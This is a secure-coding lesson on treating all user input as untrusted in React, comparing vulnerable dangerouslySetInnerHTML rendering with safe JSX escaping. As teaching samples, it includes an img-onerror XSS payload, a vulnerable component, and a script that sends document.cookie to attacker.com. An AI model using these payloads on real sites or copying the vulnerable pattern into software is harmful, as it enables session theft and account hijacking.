💡 CI01.1.1: Never Trust User Input

**Outline:**

- **The Threat (SEEI):** Understanding the danger of implicit trust in data.
- **The Defense (PPP):** Adopting a "zero-trust" mindset for all inputs.
- **Your Mission (Production):** Identify potential threats in a simple component.

### 📘 Full Lesson Content

### Part 1: Presentation - The Threat (SEEI)

**What is it? (The Vulnerability):**

The most fundamental vulnerability in any application isn't a complex cryptographic flaw; it's **implicit trust**. It's the assumption that data coming into your application—from users, APIs, or even your own database—is safe. This is a dangerous assumption. Malicious actors rely on this trust to inject harmful data that your application will then process, store, or display to other users. Every piece of external data is a potential weapon.

**How it Works (The Attack Vector):**

Imagine a simple "Welcome" component in a React app. The developer assumes the `username` prop, fetched from the URL, will always be a plain name.

```tsx
// VULNERABLE CODE
import { useSearchParams } from 'react-router-dom';

const WelcomeBanner = () => {
  const [searchParams] = useSearchParams();
  const username = searchParams.get('username');

  // DANGER: The app trusts 'username' and renders it directly.
  // What if username is "<img src=x onerror=alert('session_token_stolen')>"?
  // The script inside the string will execute in the browser.
  return <div dangerouslySetInnerHTML={{ __html: `<h1>Welcome, ${username}!</h1>` }} />;
};

```

The application implicitly trusts the `username` parameter. By crafting a malicious URL like `yoursite.com?username=<img src=x onerror=alert('XSS')>`, an attacker tricks the application into executing arbitrary JavaScript.

### Part 2: Practice - The Defense (PPP)

**The Golden Rule:**

The Golden Rule of application security is **"Never Trust User Input."** This is the core of a healthy paranoid mindset. Treat every byte of data that originates from outside your code's control as potentially hostile. This includes form inputs, URL parameters, API responses, `localStorage` values, and even data you previously stored in your own database.

**Secure Code Implementation:**

The defense is to handle all external data as just that—data. Not code. Let the rendering engine do the hard work of safely displaying it.

```tsx
// SECURE CODE
import { useSearchParams } from 'react-router-dom';

const WelcomeBanner = () => {
  const [searchParams] = useSearchParams();
  const username = searchParams.get('username') || 'Guest'; // Default value is good practice

  // SAFE: React's JSX automatically escapes the content by default.
  // If 'username' contains HTML tags, they will be rendered as plain text,
  // not interpreted by the browser. For example, '<' becomes '&lt;'.
  return <h1>Welcome, {username}!</h1>;
};

```

By default, React's JSX renderer performs output encoding. It converts potentially dangerous characters like `<` and `>` into their safe HTML entity equivalents (`&lt;` and `&gt;`). This ensures the browser interprets the input as a simple string to be displayed, not as HTML to be executed.

### 🧠 Real-World Case Study: "Vulnerable vs. Secured Code"

**The Goal:** Displaying a user's profile bio on their page.

- **Vulnerable Approach:** The developer wants to allow users to use basic HTML formatting (like `<b>` for bold) and uses `dangerouslySetInnerHTML`.
    - **Result:** An attacker sets their bio to `<script>document.location='<http://attacker.com/steal?cookie=>' + document.cookie</script>`. Anyone who views their profile has their session cookie stolen, allowing the attacker to hijack their account.
- **Secure Approach (The React Way):** The developer renders the bio directly inside a tag: `<p>{user.bio}</p>`.
    - **Result:** React treats the entire bio, including the `<script>` tag, as a literal string. The user will see the text `<script>...` on the page, but it will be inert and harmless. The attack is neutralized.

### 🤔 Reflective Questions

1. Why is data from a trusted, authenticated user still considered "untrusted" from a security perspective? What could happen if their account is compromised?
2. Beyond user forms and URL parameters, what are three other sources of external data in a typical frontend application that must be treated as untrusted?

### 📚 Further Reading

- **OWASP:** [Data Validation](https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation) - A broader look at why validating all inputs is critical.
- **React Docs:** [dangerouslySetInnerHTML](https://www.google.com/search?q=https://react.dev/reference/react-dom/components/common%23dangerouslysetinnerhtml) - Understand the tool, but more importantly, when _not_ to use it.

### 📝 Mini Task (Production)

You are reviewing the code for a simple search results page. The user's search query is taken from the URL (`?q=...`) and displayed on the page in a heading that says "Showing results for: `{query}`".

Your task: Write down the "vulnerable" way to implement this and the "secure" React way to implement it. Explain in one sentence _why_ the secure version prevents a potential attack.